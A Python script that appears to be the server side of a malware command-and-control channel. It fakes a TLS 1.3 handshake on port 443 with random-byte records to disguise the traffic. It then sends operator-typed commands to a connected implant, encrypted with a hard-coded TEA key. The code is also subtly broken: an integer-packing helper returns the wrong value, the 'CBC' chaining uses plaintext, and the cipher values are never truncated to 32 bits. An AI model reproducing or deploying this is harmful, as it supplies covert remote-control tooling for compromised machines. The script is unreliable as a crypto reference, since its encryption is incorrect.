import random
from socket import *

ip = "localhost"
port = 443

K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
magic = 0x9e3779b9

def makerandbytes(length: int) -> bytearray:
    out = []
    for x in range(0,length):
        out.append(random.randint(0,255))
    return out

def serverhello(connectionSocket):
    aa = [0x16, 0x03, 0x03, 0x00, 0x7a, 0x02, 0x00, 0x00, 0x76, 0x03, 0x03]
    ab = makerandbytes(32)
    ac = [0x20]
    ad = makerandbytes(32)
    ae = [0x13, 0x02, 0x00, 0x00, 0x2e, 0x00, 0x2b, 0x00, 0x02, 0x03, 0x04, 0x00, 0x33, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20]
    af = makerandbytes(32)
    a = aa + ab + ac + ad + ae + af

    ba = [0x17, 0x03, 0x03, 0x00, 0x17]
    bb = makerandbytes(23)
    b = ba + bb

    ca = [0x17, 0x03, 0x03, 0x03, 0x43]
    cb = makerandbytes(835)
    c = ca + cb

    da = [0x17, 0x03, 0x03, 0x01, 0x19]
    db = makerandbytes(281)
    d = da + db

    ea = [0x17, 0x03, 0x03, 0x00, 0x45]
    eb = makerandbytes(69)
    e = ea + eb

    message = a + b + c + d + e
    connectionSocket.send(bytes(message))

def encrypt(command: list[int], previous: list[int]) -> bytes: # TEA encryption
    L = command[0] ^ previous[0]
    R = command[1] ^ previous[1]
    sum = 0
    for x in range(0,32):
        sum += magic
        L += ((R << 4) + K[0]) ^ (R + sum) ^ ((R >> 5) + K[1])
        R += ((L << 4) + K[2]) ^ (L + sum) ^ ((L >> 5) + K[3])
    Lbytes = L.to_bytes(4, "big")
    Rbytes = R.to_bytes(4, "big")
    return Lbytes + Rbytes

def toint(chars: str) -> int:
    out = 0
    for x in range(0,4):
        out += ord(chars[x]) * pow(256, x)
    return x

def cbc(command: str) -> bytes:
    blocks = []
    for x in range(0,8):
        blocks.append([toint(command[4*x:4*x+4]), toint(command[4*x+4:4*x+8])])
    iv = [random.randint(0,4294967295), random.randint(0,4294967295)]
    ciphertext = iv[0].to_bytes(4, "big") + iv[1].to_bytes(4, "big")
    ciphertext += encrypt(blocks[0], iv)
    for x in range(1,len(blocks)):
        ciphertext += encrypt(blocks[x], blocks[x-1])
    return ciphertext

def main():
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind((ip, port))
    serverSocket.listen(1)
    try:
        connectionSocket, clientAddress = serverSocket.accept()
    except:
        print("No connection")
    connectionSocket.recv(2048) # read client hello
    serverhello(connectionSocket)
    connectionSocket.recv(2048) # read client hello fin
    while True:
        command = input("Input command (type|parameter):")
        if len(command) > 64:
            print("Command exceeds length")
            continue
        padded = command.ljust(64, " ")
        ciphercmd = cbc(padded)
        connectionSocket.send(ciphercmd)

if __name__ == "__main__":
    main()
